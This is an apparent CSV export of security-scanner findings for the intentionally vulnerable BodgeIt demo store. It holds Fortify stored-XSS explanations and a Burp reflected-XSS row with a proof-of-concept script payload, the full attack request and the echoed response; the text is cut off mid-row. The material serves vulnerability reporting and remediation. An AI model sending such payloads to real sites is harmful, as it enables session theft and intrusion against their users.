Team Name,Application Unique ID,Application Name,Vulnerability ID,Vulnerability Name,Vulnerability Reference,Severity,Status,Open Date,Scanner,CWE ID,CWE Name,OWASP Top 10,Path,Parameter,Payload,Attack Surface Path,Attack String,Attack Request,Attack Response,Scanner Details,Scanner Recommendation,Remediation Target Date,Application Tags,Vulnerability Tags
"DemoApps","","Bodgeit","15","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA,WebInspect,Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/search.jsp","","","http://localhost/root/search.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <b>Example 3:</b> The following code enables JavaScript in Android's WebView (by default, JavaScript is disabled) and loads a page based on the value received from an Android intent. <pre> ... WebView webview = (WebView) findViewById(R.id.webview); webview.getSettings().setJavaScriptEnabled(true); String url = this.getIntent().getExtras().getString(""url""); webview.loadUrl(url); ... </pre> If the value of <code>url</code> starts with <code>javascript:</code>, JavaScript code that follows will execute within the context of the web page inside WebView. As the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim: - As in Example 1, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. - As in Example 2, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that may include session information, from the user's machine to the attacker or perform other nefarious activities. - As in Example 3, a source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>The solution to XSS is to ensure that validation occurs in the correct places and checks for the correct properties. Since XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS. Web applications must validate their input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application may accept input through a shared data store or other trusted source, and that data store may accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user. The most secure approach to validation for XSS is to create a whitelist of safe characters that are allowed to appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alpha-numeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser should still be considered valid input once they are encoded, such as a web design bulletin board that must accept HTML fragments from its users. A more flexible, but less secure approach is known as blacklisting, which selectively rejects or escapes potentially dangerous characters before using the input. In order to form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines what characters have special meaning, many web browsers try to correct common mistakes in HTML and may treat other characters as special in certain contexts, which is why we do not encourage the use of blacklists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]: In the content of a block-level element (in the middle of a paragraph of text): - ""&lt;"" is special because it introduces a tag. - ""&amp;"" is special because it introduces a character entity. - ""&gt;"" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening ""&lt;"", but omitted it in error. The following principles apply to attribute values: - In attribute values enclosed with double quotes, the double quotes are special because they mark the end of the attribute value. - In attribute values enclosed with single quote, the single quotes are special because they mark the end of the attribute value. - In attribute values without any quotes, white-space characters, such as space and tab, are special. - ""&amp;"" is special when used with certain attributes, because it introduces a character entity. In URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters: - Space, tab, and new line are special because they mark the end of the URL. - ""&amp;"" is special because it either introduces a character entity or separates CGI parameters. - Non-ASCII characters (that is, everything above 128 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context. - The ""%"" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, ""%"" must be filtered if input such as ""%68%65%6C%6C%6F"" becomes ""hello"" when it appears on the web page in question. Within the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;: - Semicolons, parentheses, curly braces, and new line characters should be filtered out in situations where text could be inserted directly into a pre-existing script tag. Server-side scripts: - Server-side scripts that convert any exclamation characters (!) in input to double-quote characters ("") on output might require additional filtering. Other possibilities: - If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and may bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7). Once you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option in this situation is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and may be unacceptable in circumstances where the integrity of the input must be preserved for display. If input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2]. Many application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. When an application is developed there are no guarantees about what application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will also stay in sync.</Content> Tips: 1.The HPE Security Fortify Secure Coding Rulepacks warn about SQL Injection and Access Control: Database issues when untrusted data is written to a database and also treat the database as a source of untrusted data, which can lead to XSS vulnerabilities. If the database is a trusted resource in your environment, use custom filters to filter out dataflow issues that include the DATABASE taint flag or originate from database sources. Nonetheless, it is often still a good idea to validate everything read from the database. 2.Even though URL encoding untrusted data protects against many XSS attacks, some browsers (specifically, Internet Explorer 6 and 7 and possibly others) automatically decode content at certain locations within the Document Object Model (DOM) prior to passing it to the JavaScript interpreter. To reflect this danger, the rulepacks no longer treat URL encoding routines as sufficient to protect against cross-site scripting. Data values that are URL encoded and subsequently output will cause Fortify to report Cross-Site Scripting: Poor Validation vulnerabilities. 3.Fortify RTA adds protection against this category.","","",""
"DemoApps","","Bodgeit","3","Cross-site scripting (reflected)","","Critical","Open","2015-10-15","Burp Suite Pro,IBM Security AppScan Standard,Fortify SCA,WebInspect,Checkmarx","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","/bodgeit/search.jsp","q","","http://localhost:8080/bodgeit/search.jsp","clzp4&lt;script&gt;alert(1)&lt;/script&gt;g1ggi","GET /bodgeit/search.jsp?q=555-555-0199@example.comclzp4<script>alert(1)<%2fscript>g1ggi HTTP/1.1 Host: localhost:8080 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Referer: http://localhost:8080/bodgeit/search.jsp Cookie: JSESSIONID=09FC047A85CCCAD05A8F9B3FB787FF32; b_id=2","HTTP/1.1 200 OK Server: Apache-Coyote/1.1 Content-Type: text/html;charset=ISO-8859-1 Content-Length: 2064 Date: Mon, 28 Mar 2016 20:11:19 GMT Connection: close <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 3.2//EN""> <html> <head> <title>The BodgeIt Store</title> <link href=""style.css"" rel=""stylesheet"" type=""text/css"" /> <script type=""text/javascript"" src=""./js/util.js""></script> </head> <body> <center> <table width=""80%"" class=""border""> <tr BGCOLOR=#C3D9FF> <td align=""center"" colspan=""6""> <H1>The BodgeIt Store</H1> <table width=""100%"" class=\""noborder\""> <tr BGCOLOR=#C3D9FF> <td align=""center"" width=""30%"">&nbsp;</td> <td align=""center"" width=""40%"">We bodge it, so you dont have to!</td> <td align=""center"" width=""30%"" style=""text-align: right"" > Guest user </tr> </table> </td> </tr> <tr> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""home.jsp"">Home</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""about.jsp"">About Us</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""contact.jsp"">Contact Us</a></td> <!-- td align=""center"" width=""16%""><a href=""admin.jsp"">Admin</a></td--> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE> <a href=""login.jsp"">Login</a> </td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""basket.jsp"">Your Basket</a></td> <td align=""center"" width=""16%"" BGCOLOR=#EEEEEE><a href=""search.jsp"">Search</a></td> </tr> <tr> <td align=""center"" colspan=""6""> <table width=""100%"" class=""border""> <tr> <td align=""left"" valign=""top"" width=""25%""> <a href=""product.jsp?typeid=6"">Doodahs</a><br/> <a href=""product.jsp?typeid=5"">Gizmos</a><br/> <a href=""product.jsp?typeid=3"">Thingamajigs</a><br/> <a href=""product.jsp?typeid=2"">Thingies</a><br/> <a href=""product.jsp?typeid=7"">Whatchamacallits</a><br/> <a href=""product.jsp?typeid=4"">Whatsits</a><br/> <a href=""product.jsp?typeid=1"">Widgets</a><br/> <br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/> </td> <td valign=""top"" width=""70%""> <h3>Search</h3> <font size=""-1""> <b>You searched for:</b> 555-555-0199@example.comclzp4<script>alert(1)</script>g1ggi<br/><br/> <div><b>No Results Found</b></div> </font> </td> </tr> </table> </td> </tr> </table> </center> </body> </html>","The value of the <b>q</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>clzp4&lt;script&gt;alert(1)&lt;/script&gt;g1ggi</b> was submitted in the q parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response. Issue Background: <p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p> <p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p> <p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p> <p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>","<p>In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:</p> <ul> <li>Input should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.</li> <li>User input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including &lt; &gt; "" ' and =, should be replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul> <p>In cases where the application's functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.</p>","","",""
"DemoApps","","Bodgeit","137","Cross-Site Scripting: Persistent","","Critical","Open","2015-10-15","Fortify SCA","79","Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')","A3","root/admin.jsp","","","http://localhost/root/admin.jsp","","","","Abstract: <Content><Paragraph>The method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> sends unvalidated data to a web browser on line <Replace key=""PrimaryLocation.line""/>, which can result in the browser executing malicious code.<AltParagraph>Sending unvalidated data to a web browser can result in the browser executing malicious code.</AltParagraph></Paragraph></Content> Explanation: <Content>Cross-site scripting (XSS) vulnerabilities occur when: 1. Data enters a web application through an untrusted source. In the case of Persistent (also known as Stored) XSS, the untrusted source is typically a database or other back-end datastore, while in the case of Reflected XSS it is typically a web request. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is included in dynamic content that is sent to a web user without being validated. <Paragraph> In this case the data is sent at <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data like cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site. <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 1:</b> The following code segment queries a database for an employee with a given ID and prints the corresponding employee's name in the servlet response. <pre> ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } ServletOutputStream out = response.getOutputStream(); out.print(""Employee Name: "" + name); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;c:out value=""${name}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 1:</b> The following code first queries a database for an employee with a given ID, converts the results into a list, and stores the list inside <code>employeesBean</code>. <pre> public class employeesBean { private List&lt;EmployeeData&gt; employeeList; ... public List&lt;EmployeeData&gt; getEmployeeList() { ... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); return convertToList(rs); } ... } </pre> Then it uses JSF's <code>dataTable</code> construct to print the corresponding employee's name. <pre> &lt;f:view&gt; ... &lt;h:dataTable value=""employeesBean.employeeList"" var=""employee""&gt; ... &lt;h:column&gt; &lt;f:facet name=""header""&gt; &lt;h:outputText value=""Employee Name""&gt; &lt;/f:facet&gt; &lt;h:outputText value=""#{employee.name}"" escape=""false""/&gt; &lt;/h:column&gt; ... &lt;/h:dataTable&gt; ... &lt;/f:view&gt;</pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 1:</b> The following JSP code segment queries a database for an employee with a given ID and prints the corresponding employee's name. <pre> &lt;%... Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(""select * from emp where id=""+eid); if (rs != null) { rs.next(); String name = rs.getString(""name""); } %&gt; Employee Name: &lt;%= name %&gt; </pre> </ConditionalText> </Paragraph></IfDef> This code functions correctly when the values of <code>name</code> are well-behaved, but it does nothing to prevent exploits if they are not. This code can appear less dangerous because the value of <code>name</code> is read from a database, whose contents are apparently managed by the application. However, if the value of <code>name</code> originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker can execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it more difficult to identify the threat and increases the possibility that the attack will affect multiple users. XSS got its start in this form with web sites that offered a ""guestbook"" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code. <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""sink:java.io sink:javax.servlet trace:!jsp""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from an HTTP servlet request, then displays the value back to the user in the servlet's response. <pre> String eid = request.getParameter(""eid""); ... ServletOutputStream out = response.getOutputStream(); out.print(""Employee ID: "" + eid); ... out.close(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsp/jstl""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user via the <code>&lt;c:out/&gt;</code> tag. By setting <code>escapeXml=""false""</code>, it does not perform even basic checking for potentially malicious data. <pre> Employee ID: &lt;c:out value=""${param.eid}"" escapeXml=""false""/&gt; </pre> </ConditionalText> <ConditionalText condition=""trace:java.sun.com/jsf trace:myfaces.apache.org/trinidad trace:myfaces.apache.org/tomahawk""> <b>Example 2:</b> The following code reads an employee ID, <code>eid</code>, from a JSF form. <pre> ... &lt;h:form&gt; Enter employee ID: &lt;h:inputText value=""#{eid}""/&gt; &lt;/h:form&gt; ... </pre> Its response page then reads the value of <code>eid</code> and displays it to the user. <pre> ... Employee ID: &lt;h:outputText value=""#{eid}"" escape=""false""/&gt; ... </pre> </ConditionalText> <ConditionalText condition=""sink:_jspService sink:_jspInit sink:jspwriter trace:!/jsf|jstl|myfaces/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt; </pre> </ConditionalText> <ConditionalText condition=""sink:!/java\.io|javax\.servlet|_jspInit|_jspService|jspwriter/""> <b>Example 2:</b> The following JSP code segment reads an employee ID, <code>eid</code>, from an HTTP request and displays it to the user. <pre> &lt;% String eid = request.getParameter(""eid""); %&gt; ... Employee ID: &lt;%= eid %&gt;</pre> </ConditionalText> </Paragraph></IfDef> As in Example 1, this code operates correctly if <code>eid</code> contains only standard alphanumeric text. If <code>eid</code> has a value that includes meta-characters or source code, then the code will be executed by the web browser as it displays the HTTP response. Initially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use e-mail or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS. Some think that in the mobile world, classic web application vulnerabilities, such as cross-site scripting, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is 